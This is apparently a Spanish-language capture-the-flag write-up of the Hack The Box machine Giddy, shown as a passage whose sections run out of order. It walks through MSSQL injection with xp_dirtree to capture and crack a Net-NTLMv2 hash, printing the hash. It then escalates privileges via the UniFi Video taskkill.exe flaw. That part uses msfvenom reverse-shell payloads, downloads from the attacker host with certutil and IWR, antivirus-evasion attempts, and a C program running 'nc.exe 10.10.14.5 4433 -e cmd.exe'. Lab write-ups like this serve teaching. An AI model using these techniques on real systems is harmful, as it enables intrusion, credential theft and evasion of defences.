+---------------+
```

Pos si, los tipos de tarjetas de crédito 😑

Ahora nos queda movernos entre las bases de datos, sus tablas y columnas a ver en cuáles encontramos algo útil...

...

### Jugando con comandos de <u>MSSQL</u> [🔗](#mvc-sqli-exec) {#mvc-sqli-exec}

Después de una ardua enumeración no encontramos nada de nada :(

> Al menos nos sacamos un lindo lindo script.

Buscando de que otras maneras podemos aprovecharnos de esta inyección, llegamos a esta gran lista de payloads para usar:

* [PayloadAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md).

En él hay [algunas maneras de ejecutar comandos](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution) con la instrucción [xp_cmdshell](https://www.sqlshack.com/es/como-utilizar-el-procedimiento-extendido-xp_cmdshell/), pero probando cositas no obtenemos respuestas :(

### <span style="color: red;">✘</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> [🔗](#smclient-mvc-sqli-exec-xpdirtree) {#smclient-mvc-sqli-exec-xpdirtree}

Si seguimos bajando llegamos al apartado [MSSQL UNC Path](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-unc-path), el cual nos indica que **MSSQL** soporta el listado de archivos que existan en un directorio compartido a través de **SMB**, esto mediante la instrucción [xp_dirtree](https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html). 

Esto es interesante porque si logramos que el usuario de la base de datos (`Stacy`) haga la conexión contra nuestro folder compartido, llegara con ella un hash como método de autenticación, ese hash puede llegar a ser crackeable, pero claro, dependemos de cuan fuerte o no es la contraseña que hay por detrás.

* [Explicación concreta de los tipos de hashes: **LM**, **NTLM** y **Net-NTLMv2**](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

Bien, pues compartamos una carpeta, usemos [smbclient.py](https://neil-fox.github.io/Impacket-usage-&-detection/#smbclientpy):

```bash
❱ smbserver.py smbFolder $(pwd)
```

La carpeta compartida se llama `smbFolder` y toma la ruta actual en la que estemos (: ahora ejecutemos la instrucción a ver si llega alguna conexión:

```bash
❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5\smbFolder'"

[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5\smbFolder';-- -

[+] Listonessss.
```

Si revisamos nuestra carpeta vemos una conexióóóóóóóóóóóóón:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_smbclient_stacy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Sip, **Stacy** hace dos conexiones por lo tanto vemos dos hashes, si nos [guiamos del recurso anteriormente citado](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) sabemos que es un hash **Net-NTLMv2**, podemos jugar con `John The Ripper` e intentar crackearlo:

Lo guardamos en un archivo:

```bash
❱ cat stacy.hash 
Stacy::GIDDY:aaaaaaaa:7314d853e80f9b14ffd777487e0ded22:0101000000000000800c43548681d7018508a21f5f6d94bf00000000010010007a007800530076004200560076004300020010004a007800660055004800650073007900030010007a007800530076004200560076004300040010004a00780066005500480065007300790007000800800c43548681d70106000400020000000800300030000000000000000000000000300000483c10b9e519cd8ccad95791e38cd0e00f9987c059e89a051afd94f7f5f7fb820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
```

Y ahora con `john`:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
```

Pero la respuesta nos deja muertos:

> <span style="color: yellow;">No password hashes loaded (see FAQ)</span>

### <span style="color: green;">✔</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> [🔗](#responder-mvc-sqli-exec-xpdirtree) {#responder-mvc-sqli-exec-xpdirtree}

Jmm F, intentando e intentando cositas no logramos respuesta distinta a esa. Leyendo el post de los hashes hablan de una herramienta llamada [responder](https://github.com/lgandx/Responder), la cual (entre muuuchas cosas) también nos sirve como intermediario para cuando alguien intenta conectarse o interactuar con nuestro sistema. Intentemos con ella a ver si vemos algo distinto:

Al ser la primera vez que lo uso, debemos descargarlo:

1. Vamos al repo de la tool.
2. En nuestra terminal hacemos `git clone https://github.com/lgandx/Responder.git`.
3. Y ya tendríamos el programa `Responder.py`, lo renombraré a `responder.py` para que sea más sencillo el llamado (que pereza escribir la primera en mayus 😊)

En internet encontramos [este recurso](https://www.a2secure.com/en/blog/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/) que nos muestra como usar `Responder` para capturar hashes `NetNTLM`.

Si queremos validar el tráfico de alguna interfaz, por ejemplo de la `tun0`, que seria donde esta **HTB**:

```bash
❱ ifconfig 
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ...
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ...
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        ...
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.5  netmask 255.255.254.0  destination 10.10.14.5
        ...
```

Y ahora ejecutaríamos con el `responder` que analice el tráfico de esa interfaz:

```bash
❱ responder.py -I tun0 -A  
```

Nos desplegara algunas opciones activas o inactivas del programa y al final nos mostrara que esta en escucha por la interfaz `tun0`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_tun0_A.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora bien, para capturar el hash de `Stacy` (que es el user que hace la petición) debemos quitar el parámetro `-A`:

```bash
❱ responder.py -I tun0
```

Lo siguiente será enviar una petición desde el servicio **MSSQL** a nuestra **IP** servida en la interfaz `tun0`, o sea, a la `10.10.14.5` y ver que pasa en el **responder**:

```bash
❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5'"

[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5';-- -

[+] Listonessss.
```

Yyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_stacy_hash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, también obtenemos el hash `Net-NTLMv2` de **Stacy**, hagamos lo mismo de antes, lo tomamos, lo guardamos en un archivo y jugamos con `john`:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_john_stacy_hash_cracked.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECTISIIIIIIIIIIIIIIIIIIMO, ahora sí logramos que tome el hash y mejor aún, que lo crackeeeeeeeeeeeeeeeeeeee.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_football_letsgo.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Que locura, lindo lindo...

Si recordamos en nuestro escaneo de `nmap`, el servicio `WinRM` por el puerto `5985` esta activo, entre las cosas que podemos hacer con él, ahí un recurso que lo aprovecha para generar una consola **PowerShell** llamado [evil-winrm](https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html), usémoslo y de una validemos si las credenciales son funcionales:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones ahora sí, estamos dentro del sistema como el usuario `Stacy` (:

...

Otra alternativa hubiera sido el usar la interfaz web que encontramos en nuestra enumeración web, la recuerdan? Había un recurso llamado `Remote`, si intentamos logearnos con esas credenciales, conseguimos una **PowerShell** en la web (que va un toque más rápida que la que tenemos con `evil-winrm`):

* [Con este recurso vemos un ejemplo de uso de la interfaz web](https://practical365.com/powershell-web-access-just-how-practical-is-it/).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si una nos falla o algo así, ya tenemos un respaldo :P sigamos...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En el directorio en el que salimos cuando obtenemos nuestra **PowerShell** vemos un archivo con un nombre algo extraño:

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir

    Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
...
```

Me dio curiosidad y busqué que era eso, la curiosidad nos dio vida:

> "unifi-video", tambien llamado "UniFi" es una solucion de video vigilancia, o sea, de camaras de seguridad.

Si le agregamos a nuestra búsqueda `"exploit"` vemos algo interesante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lindo, un exploit que nos permite escalar privilegios, es más o menos viejito (concuerda con las fechas de la máquina) así que veámoslo a ver que nos comenta.

* [Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation](https://www.exploit-db.com/exploits/43390).

Tenemos varias cosas a destacar:

> Ubiquiti UniFi Video for Windows is installed to `C:\ProgramData\\unifi-video\` by default.

Validemos si efectivamente existe la ruta y tiene el contenido del programa:

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir C:\ProgramData\\unifi-video\

    Directory: C:\ProgramData\\unifi-video

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        7/26/2018  11:23 AM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
-a----        7/26/2017   6:10 PM         219136 avService.exe
-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp
-a----        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
...
```

Perfecto, vamos bien :)

> Default permissions on the `C:\ProgramData\\unifi-video` folder are inherited from `C:\ProgramData` and are **not explicitly overridden**, which **allows all users**, even **unprivileged** ones, to **append and write files to the application directory**.

Validemos si es cierto que tenemos permisos de escritura con ayuda de `icacls`:

```powershell
*Evil-WinRM* PS C:\ProgramData> icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(F)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Successfully processed 1 files; Failed processing 0 files
```

Pues si, como `BUILTIN\Users` tenemos varios permisos, pero los interesantes son:

* `WD`: "escribir datos/agregar archivo".
* `AD`: "anexar datos/agregar subdirectorio".

Les dejo una [lista](https://www.pantallazos.es/2018/03/windows-server-icacls-modificar-permisos-NTFS.html) de los permisos que encontramos y su significado.

Vamos aún mejor, veamos de que nos sirve saber esto:

> Upon **start** and **stop** of the service, it tries to **load and execute** the file at `C:\ProgramData\\unifi-video\taskkill.exe`. However this file does not exist in the application directory by default at all.

Y llega el remate:

> By **copying an arbitrary** `taskkill.exe` to `C:\ProgramData\\unifi-video\` as an unprivileged user, it is therefore possible to **escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM**.

:o upaaaa, pues sencillo, solo debemos encontrar el nombre del servicio, generar un payload malicioso puede ser con ayuda de `msfvenom` llamado `taskkill.exe` y posicionarlo en la ruta `C:\ProgramData\\unifi-video\`. Lo siguiente seria detener o iniciar el servicio, esperar que busque el archivo `taskkill.exe`, lo ejecute y ver como obtenemos nuestra Shell (:

Démosleeeeeeeeeeeeeeeeeeeeeeeeeeeee.

...

### Generamos archivo <u>taskkill.exe</u> malicioso [🔗](#msfvenom-taskkillexe) {#msfvenom-taskkillexe}

Creemos nuestro binario `taskkill.exe` con ayuda de `msfvenom`, le indicaremos que una vez se ejecute envíe una petición hacia X puerto con una **CMD**, o sea, generamos una **Reverse Shell**:

```bash
❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4433 -f exe > taskkill.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Listo, ya lo tenemos, sigamos...

### Buscamos servicio relacionado con <u>unifi-video</u> [🔗](#find-service-unifivideo) {#find-service-unifivideo}

Ahora lo que debemos hacer es listar toodos los servicios del sistema y buscar específicamente alguno relacionado con `unifi-video`.

Pero F, los comandos que podemos usar o nos matan la terminal o nos devuelven errores:

```powershell
*Evil-WinRM* PS C:\ProgramData> net start
net.exe : System error 5 has occurred.
...
Access is denied.
```

```powershell
*Evil-WinRM* PS C:\ProgramData> wmic service list brief
WMIC.exe : ERROR:
...
Description = Access denied
```

```powershell
*Evil-WinRM* PS C:\ProgramData> Get-Service
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
...
```

> Tomadas de [Hacktricks.xyz - WinPrivEsc/Services](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services).

Así que tamos tristes :(

Buscando en internet maneras de detener o iniciar procesos con **PowerShell**, encontramos dos herramientas:

* [Powershell: How to Start (**start-service**) or Stop (**stop-service**) services](https://www.windows-commandline.com/start-stop-service-using-powershell/).

Pero seguimos igual, no sabemos el nombre del servicio... 

Probando algunos randoms siempre recibimos un error, por ejemplo buscando `unifi-video` como nombre de servicio:

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> Stop-Service "unifi-video"
Cannot find any service with service name 'unifi-video'.
...
```

:(

Si volvemos a nuestro exploit, en los detalles de la vulnerabilidad hace referencia a un servicio con nombre `Ubiquiti UniFi Video`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Así que podemos probar con ese nombre, si no nos funciona ya tendríamos una base para quitar, agregar, modificar o juntar **palabras** en busca de algún nombre para el servicio.

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> Stop-Service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
```

OPAAAAAAAAAAAAAAA, si señorrrrrrrrrrr, al parecer tenemos el nombre del serviciooooooooooooooooooo, pues perfectisimo, ahora simplemente nos queda probar a subir el binario y recibir nuestra **reverse Shell**:

### Subimos el binario al sistema de diferentes maneras [🔗](#uploading-taskkillexe-ways) {#uploading-taskkillexe-ways}

Aprovechemos y subamos el binario de 3 formas, con `certutil.exe`, con una de las opciones de `PowerShell` yyy con ayuda de una carpeta compartida por **SMB**:

Levantemos un servidor web con **Python** en la ruta donde tenemos el archivo `taskkill.exe`:

```bash
❱ python3 -m http.server
```

---

##### <u>certutil.exe:</u>

---

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> certutil.exe -f -urlcache -split http://10.10.14.5:8000/taskkill.exe taskkill.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

Y ya lo tendriamos (:

##### <u>Usando la clase InvokeWebRequest de PowerShell:</u>

---

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
```

Y tambien ya tendriamos el binario en la máquina victima.

##### <u>Compartiendo una carpeta con SMB:</u>

---

```bash
❱ smbserver.py smbFolder $(pwd)
```

Ya tendríamos nuestra carpeta compartida llamada `smbFolder` situada en la ruta del binario `taskkill.exe`, ahora desde la máquina víctima le decimos que se conecte a esa carpeta, pero que además haga una copia de uno de sus archivos a la ruta actual:

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> copy \\10.10.14.5\smbFolder\taskkill.exe taskkill.exe
```

Recibimos la peticion en nuestra carpeta compartida, esperamos un momento yyyyyyyyy ya tendriamos tambien nuestro archivo `taskkill.exe` (:

Listos, ahora si explotemos estooooo.

Pongamonos en escucha por el puerto **4433** que fue el que indicamos en nuestro binario malicioso:

```bash
❱ nc -lvp 4433
```

---

### Intentamos que el servicio <u>unifi-video</u> ejecute el binario malicioso [🔗](#trying-service-taskkillexe) {#trying-service-taskkillexe}

Jugando con el binario y el servicio:

* `Stop-Service "Ubiquiti UniFi Video"`
* `Start-Service "Ubiquiti UniFi Video"`

No pasa nada de nada :P y por el contrario algo que nos damos cuenta es que el sistema nos borra `taskkill.exe`, si intentamos nosotros mismo ejecutarlo obtenemos esto:

```bash
*Evil-WinRM* PS C:\ProgramData\\unifi-video> .\taskkill.exe
Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
...
```

Jmmm, al parecer el sistema esta identificando el binario como malicioso (lo és :P) y por consiguiente esta siendo borrado... Esto puede ser obra del `antivirus`, el propio `Windows Defender` o incluso de algún `App Locker`. Se pone linda la cosa ya que tendremos que bypassear alguno (o todos) de ellos :)

...

### Bypasseamos <u>Antivirus</u>, <u>Windows Defender</u>, <u>App Locker</u> y lo que se venga [🔗](#bypass-av-and-things) {#bypass-av-and-things}

---

##### Fail con <u>Phantom Evasion<u>

Buscando y buscando encontramos finalmente un recurso que hace referencia a otro recurso y ese otro recurso habla de otro recurso, ese último se llama [Phantom Evasion](https://github.com/oddcod3/Phantom-Evasion), una herramienta para eso, evadir cositas como los antivirus.

> <span style="color: #f34336;">Esta parte es de aprendizaje en cuanto a la herramienta porque al final la explote de otro modo</span> :P

Hay varios recursos que hablan de ella:

* [YT - Evasión de antivirus con Phantom Evasion](https://www.youtube.com/watch?v=fgjTbUrAHbg).
* [Cómo evadir protección antivirus con Phantom Payloads](https://noticiasseguridad.com/tutoriales/como-evadir-proteccion-antivirus-con-phantom-payloads/).

Después de descargarlo, en su ejecución la interfaz es sencilla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_menu.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Obviaremos algunas opciones, vamos a irnos por el número `1` directamente:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_phantomEvasion_modules.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Acá (podemos jugar con la primera, lo hice de todas las maneras posibles, pero F) seleccionamos la segunda opción, o sea escribimos `2`, esta opción nos generaría un binario que al ser ejecutado con éxito devolvería una falsa shell, es funcional para saber que tenemos ejecución de comandos y que estamos bypasseando el antivirus y los diferentes bloqueos que existan.

Entonces, seleccionamos la opción `2`, nos devolverá la info inicial del binario a generar y empezara a preguntarnos algunas opciones, las importantes van a ser:

* `LHOST`: Nuestra IP, **10.10.14.5**.
* `LPORT`: El puerto donde vamos a estar en escucha, **4433**.
* `Strip executable?`: Indicamos la letra `Y`, para SIIIIIIIIIIIIIIIIIIIIII e.e Esto hace que el binario no sea tan pesado.
* La opción del certificado me daba errores, así que la cambie por `n` y ya todo perfecto.
* `Insert output filename`: **taskkill**. Que será el nombre del binario, en la opción anterior por default esta la extensión `exe`, así que tamos bien.

Nos responde:

```bash
[>] Generating code...

[>] Compiling...

[>] Strip binary...

[<>] File saved in Phantom-Evasion folder
```

Y si revisamos el directorio donde ejecutamos `phantom evasion` vemos el binario `taskkill.exe`:

```bash
❱ file taskkill.exe 
taskkill.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

Listooones, pues ahora intentemos subirlo y jugar con el servicio, pero claro, si aún no estamos en escucha por el puerto del binario (4433) lo hacemos:

```bash
❱ nc -lvp 4433
```

Subimos el binario, lo primero que vemos es que no nos lo borra, así que puede ser el bueno, encendemos y apagamos el servicio y cruzamos los dedos de los pies a ver si logramos algo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS_startStop_service.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Es trivial cuantos warning nos va a mostrar :P peeeeeeeeeeeeeeero en cualquier momento vemos estoooooooooooooo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_fakeshell_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si si siiiiiii, recibimos una petición, por lo tanto hemos bypasseado tooooooodo todito.

Pero (siempre hay peros, ihsss) no podemos hacer nada con ese payload, lo bueno es que confirmamos a `phantom evasion` como funcional, ahora solo nos quedaría probar entre sus opciones y ver cuál nos puede devolver una verdadera shell...

Pero (de nuevo un peroooooo), como ya comente antes, probé y probé y nada, no logre hacer funcionar una shell...

...

En este punto ya estaba loco locooooooo, no sabía pa onde mirar, así que necesitaba un momento de calmita, de respirar profundo y organizar ideas. Después de un rato, caí en cuenta de algo en lo que debí haber pensado desde el inicio, pero bueno, no pasa nada, aprendimos sobre la herramienta `phantom evasion`.

**Y sí nos creamos nosotros mismos un binario llamado `taskkill.exe` que haga lo que queramos? u.u jajaj**

...

Pos sí, démosle a esa idea, podemos apoyarnos del lenguaje de programación `C` y su función `system();`, simplemente para compilar el script a un formato válido en **Windows** usamos la herramienta `mingw-w64`. A darleeeee:

Entonces, si no tenemos ni idea, una búsqueda rápida en internet nos dará vaaarios ejemplos como base:

* [C Exercises: Invoke the command processor to execute a command](https://www.w3resource.com/c-programming-exercises/variable-type/c-variable-type-exercises-1.php).

Lo tomamos y nos quedamos únicamente con las librerías, la función main y la función `system`:

```c
#include<stdio.h>
#include<stdlib.h>

int main () {
    system();
} 
```

Donde `system` tendrá lo que queramos ejecutar a nivel de sistema, para no hacer más largo el writeup voy a hacer un spoiler, si no quieres verlo, NO OPRIMAS LO DE ABAJO e.e

<details>
  <summary><strong>SPOILER resolución final</strong></summary>
  
  <span style="color: yellow;">El script y el binario generado van a ser la salvación e.e (esto no era lo que iba a escribir, pero pues me gusto, así que ahí se queda).</span>
</details>

Como prueba anterior, subí el binario `nc.exe` a la máquina a ver si también era borrado, pero no, no lo borra el sistema, así que podemos indicarle al script que tome ese binario y nos haga una Reverse Shell de toda la vida:

```c
#include<stdio.h>
#include<stdlib.h>

int main () {
    system("c:\\Users\\Stacy\\Videos\\nc.exe 10.10.14.5 4433 -e cmd.exe");
} 
```

Ya con el script finalizado lo compilamos, siguiendo este hilo lo logramos:

* [How to compile executable for Windows with GCC with Linux Subsystem?](https://stackoverflow.com/questions/38786014/how-to-compile-executable-for-windows-with-gcc-with-linux-subsystem).

Inicialmente lo compilare para **64 bits** si no nos sirve, pues lo intentamos con **32**:

```bash
❱ x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe
```

```bash
❱ file taskkill.exe 
taskkill.exe: PE32+ executable (console) x86-64, for MS Windows
```

Listo, ahora simplemente subimos tooodo, nos ponemos en escucha por el puerto **4433** yyyyyy jugamos con el servicio:

...

> Me tire tooooooooodo lo que relacione a `Ruby` por instalar una herramienta que nos ayudaba con el **Bypass de AV**. 

(Y pues se fue a la p*** el `evil-winrm` asdjflkajsldkfñl)

> Ya lo arreglé, tamos felices. Por no usar sandboxes o pequeños entornos que no afecten a las gemas y demás cositas. Algo más aprendido jajajaj a la fuerza pero aprendido.

😇

...

Ahora sí, subamos todo a la máquina:

```bash
❱ python3 -m http.server
```

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> IWR -uri http://10.10.14.5:8000/taskkill.exe -OutFile taskkill.exe
*Evil-WinRM* PS C:\ProgramData\\unifi-video> IWR -uri http://10.10.14.5:8000/nc64.exe -OutFile c:\Users\Stacy\Videos\nc.exe
```

```bash
❱ nc -lvp 4433
```

Detenemos el servicio:

```powershell
*Evil-WinRM* PS C:\ProgramData\\unifi-video> stop-service "Ubiquiti UniFi Video"
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop...
...
```

Yyyyyyyyyyyy en nuestro listeneeeeeeeeeeeeeeeeeeeer:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_nc_NTauthoritySH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERO CLAROOOOOOOOO QUE SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, OMG, mi cerebro respira e.e Tamos dentro del sistema como el usuario **nt authority\system**, el master de los masters.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_menhands_done.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

IT'S OOOOOOOOOOOOVER

...

Terminamos después de un largo camino, pero un camino llenísimo de aprendizaje, prácticamente todo lo que vimos en esta máquina fue nuevo para mí, así que increíble, muy lindo lo que hicimos y lo que probamos.

Salió un bello script (que inicialmente no era la idea, iba a ser muuucho más sencillo, pero uff, me encanto), intentamos (lo logramos en gran medida) bypassear el AV, el Windows Defender, el App Locker y lo que se nos interpusiera e.e

Muy linda máquina, brutalmente llevada a la realidad creo yo, una base de datos con 0 data importante, pero que puede permitir ejecutar comandos **SQL** y entornos super controlados, pero realmente no tanto, llega un script de visita con dos líneas y destruye todo lo que tenías "controlado" :(

Bueno basta!! Los dejo descansar y perdón que a veces me extienda o haga cosas que para algunos son obvias, pero esa es la idea, dejar la obviedad de lado y reforzar cositas e incluso dejar que alguien con menos experiencia aprenda algo nuevo. 

Nos leeremos después y a seguir rompiendo tooodoooo no jodaaaaaaaaaaaaaaaaaa!!

Tenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Microsoft IIS httpd 10.0 |
| 443    | HTTPS    | Microsoft IIS httpd 10.0 |

Vemos un `commonName` muy atractivo:

* `commonName=PowerShellWebAccessTestWebSite`

Nos da la idea de tener una Shell en la web, ya veremos.

| 3389   | RDP      | Microsoft Terminal Services |

Muchas referencias al nombre **Giddy** (mayusculas y minusculas)

* `DNS_Computer_Name: Giddy`

Jmmm, pues empecemos a explorar cada puerto y descubramos por donde podemos romperlos.

...

### Puerto 80 [🔗](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Un perrito :D de primeras se me ocurre algo con **estenografía** (ojalá no), pero sigamos explorando... Hagamos un fuzzeo de directorios a ver si algo se nos escapa de los ojos:

```bash
❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.104
...
Target: http://10.10.10.104/

[25:25:25] Starting: 
[25:25:25] 301 -  157B  - /aspnet_client  ->  http://10.10.10.104/aspnet_client/
[25:25:25] 302 -  157B  - /remote  ->  /Remote/default.aspx?ReturnUrl=%2fremote
[25:25:25] 301 -  157B  - /Aspnet_client  ->  http://10.10.10.104/Aspnet_client/
[25:25:25] 301 -  147B  - /mvc  ->  http://10.10.10.104/mvc/
[25:25:25] 301 -  157B  - /aspnet_Client  ->  http://10.10.10.104/aspnet_Client/
[25:25:25] 302 -  157B  - /Remote  ->  /Remote/default.aspx?ReturnUrl=%2fRemote
[25:25:25] 301 -  157B  - /ASPNET_CLIENT  ->  http://10.10.10.104/ASPNET_CLIENT/
[25:25:25] 400 -  324B  - /besalu%09
[25:25:25] 400 -  324B  - /error%1F_log
...
```

Opaa, encontramos tres rutas:

* `/aspnet_client`.
* `/remote`.
* `/mvc`.

Validando cada una, `/aspnet_client` nos devuelve `acceso denegado` :( si revisamos `/remote`, con ella si obtenemos respuesta y caemos acá:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perefeto, nos pide varias cosas, pero la principal es que nos movamos al servicio **HTTPS**, así que nos movemos a:

* `https://10.10.10.104/remote`

Y conseguimos el mismo output, pero sin el error del **SSL** (: Juguemos con el login a ver...

> `Windows PowerShell Web Access` (que llamaremos **PSWA**): "acts as a Windows PowerShell gateway, providing a **web-based Windows PowerShell console** that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device." [Install and Use Windows PowerShell Web Access](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)).

* [How to use Microsoft PowerShell Web Access](https://practical365.com/powershell-web-access-just-how-practical-is-it/).

Intentando algunas cositas como buscar `Windows PowerShell Web Access exploit` o credenciales por default, no conseguimos nada útil. 

